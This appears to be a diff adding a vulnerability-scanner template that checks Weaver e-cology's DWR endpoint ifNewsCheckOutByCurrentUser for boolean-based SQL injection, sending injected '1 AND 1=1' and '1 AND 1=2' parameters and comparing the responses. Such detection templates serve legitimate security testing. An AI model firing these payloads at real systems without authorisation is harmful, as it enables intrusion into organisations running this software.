@@ -1,0 +1,38 @@
+name: weaver-ecology-ifnewscheckoutbycurrentuser-dwr-sqli
+rules:
+  - method: POST
+    path: "/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr"
+    headers:
+      Content-Type: text/plain
+    body: |
+      callCount=1
+      page=
+      httpSessionId=
+      scriptSessionId=
+      c0-scriptName=DocDwrUtil
+      c0-methodName=ifNewsCheckOutByCurrentUser
+      c0-id=0
+      c0-param0=string:1 AND 1=1
+      c0-param1=string:1
+      batchId=0
+    expression: |
+      response.status == 200 && response.body.bcontains(b"dwr.engine._remoteHandleCallback('0','0',true)")
+  - method: POST
+    path: "/dwr/call/plaincall/CptDwrUtil.ifNewsCheckOutByCurrentUser.dwr"
+    headers:
+      Content-Type: text/plain
+    body: |
+      callCount=1
+      page=
+      httpSessionId=
+      scriptSessionId=
+      c0-scriptName=DocDwrUtil
+      c0-methodName=ifNewsCheckOutByCurrentUser
+      c0-id=0
+      c0-param0=string:1 AND 1=2
+      c0-param1=string:1
+      batchId=0
+    expression: |
+      response.status == 200 && response.body.bcontains(b"dwr.engine._remoteHandleCallback('0','0',false)")
+detail:
+  author: 666
